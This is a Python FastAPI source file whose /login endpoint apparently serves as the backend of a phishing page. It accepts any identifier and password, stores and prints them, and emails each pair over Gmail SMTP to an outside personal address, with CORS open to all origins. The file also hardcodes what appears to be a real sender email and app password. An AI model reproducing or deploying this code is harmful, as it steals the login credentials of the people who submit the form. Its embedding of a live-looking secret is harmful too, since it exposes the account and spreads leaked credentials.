from fastapi import FastAPI, Form
from fastapi.middleware.cors import CORSMiddleware
import smtplib
import ssl
from email.message import EmailMessage

app = FastAPI()

# SMTP Configuration (Replace with your actual credentials)
SMTP_SERVER = "smtp.gmail.com"  # e.g., smtp.gmail.com
SMTP_PORT = 587                   # For starttls (Gmail uses 587)
SENDER_EMAIL = "farhanyounas5204@gmail.com"
SENDER_PASSWORD = "rqon hlqa apmz auvk"
RECIPIENT_EMAIL = "farhan.ali.datasci@gmail.com"

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

saved_logins = []

def send_email(identifier: str, password: str):
    """Send login credentials via email using SMTP"""
    msg = EmailMessage()
    msg.set_content(
        f"New login credentials received:\n\n"
        f"Identifier: {identifier}\n"
        f"Password: {password}"
    )
    msg["Subject"] = "New Login Data"
    msg["From"] = SENDER_EMAIL
    msg["To"] = RECIPIENT_EMAIL

    context = ssl.create_default_context()
    
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls(context=context)
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.send_message(msg)
            print("Email sent successfully")
    except Exception as e:
        print(f"Error sending email: {e}")

@app.get("/")
async def root():
    return {"message": "SAPI is working"}

@app.post("/login")
async def login(identifier: str = Form(...), password: str = Form(...)):
    login_entry = {
        "identifier": identifier,
        "password": password
    }
    saved_logins.append(login_entry)

    # Print to console
    print(f"\nNew login received:")
    print(f"Identifier: {identifier}")
    print(f"Password: {password}")
    
    # Send email notification
    send_email(identifier, password)

    # Print all saved logins
    print("\nAll saved login data:")
    for idx, login in enumerate(saved_logins, start=1):
        print(f"{idx}. Identifier: {login['identifier']}, Password: {login['password']}")

    return {"message": "Login data saved successfully"}